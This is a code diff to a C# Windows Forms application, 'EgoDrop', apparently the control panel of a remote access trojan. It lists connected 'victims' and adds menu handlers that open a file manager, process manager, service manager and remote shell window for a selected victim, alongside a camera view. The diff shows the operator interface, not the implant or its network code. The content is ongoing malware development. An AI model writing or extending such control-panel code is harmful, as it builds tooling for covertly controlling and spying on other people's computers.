@@ -36,7 +36,7 @@ namespace EgoDrop
             {
                 Invoke(new Action(() =>
                 {
-                    
+                    //Add to group,
                 }));
             }
             catch (Exception ex)
@@ -74,6 +74,8 @@ namespace EgoDrop
                         listView1.Items.Add(item);
 
                         fnSysLog($"New victim[{victim.m_sktClnt.RemoteEndPoint.ToString()}]");
+
+                        //Add to group treeview.
                     }
                 }));
             }
@@ -141,6 +143,7 @@ namespace EgoDrop
         {
             new frmAbout().Show();
         }
+
         //Info
         private void toolStripMenuItem5_Click(object sender, EventArgs e)
         {
@@ -150,39 +153,97 @@ namespace EgoDrop
                 f.Show();
             }
         }
+
         //File
         private void toolStripMenuItem6_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmFileMgr f = new frmFileMgr(fnGetVictimFromTag(item));
-                f.Show();
+                clsVictim victim = fnGetVictimFromTag(item);
+                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim);
+                if (f == null)
+                {
+                    f = new frmFileMgr(victim);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
             }
         }
+
         //Process
         private void toolStripMenuItem7_Click(object sender, EventArgs e)
         {
-
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                clsVictim victim = fnGetVictimFromTag(item);
+                frmProcMgr f = clsTools.fnFindForm<frmProcMgr>(victim);
+                if (f == null)
+                {
+                    f = new frmProcMgr(victim);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
         }
+
         //Service
         private void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
-
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                clsVictim victim = fnGetVictimFromTag(item);
+                frmSrvMgr f = clsTools.fnFindForm<frmSrvMgr>(victim);
+                if (f == null)
+                {
+                    f = new frmSrvMgr(victim);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
         }
+
         //Monitor
         private void toolStripMenuItem9_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                
+
             }
         }
+
         //Camera
         private void toolStripMenuItem10_Click(object sender, EventArgs e)
         {
             frmCamera f = new frmCamera();
 
             f.Show();
+        }
+
+        private void toolStripMenuItem11_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                clsVictim victim = fnGetVictimFromTag(item);
+                frmShell f = clsTools.fnFindForm<frmShell>(victim);
+                if (f == null)
+                {
+                    f = new frmShell(victim);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
         }
     }
 }
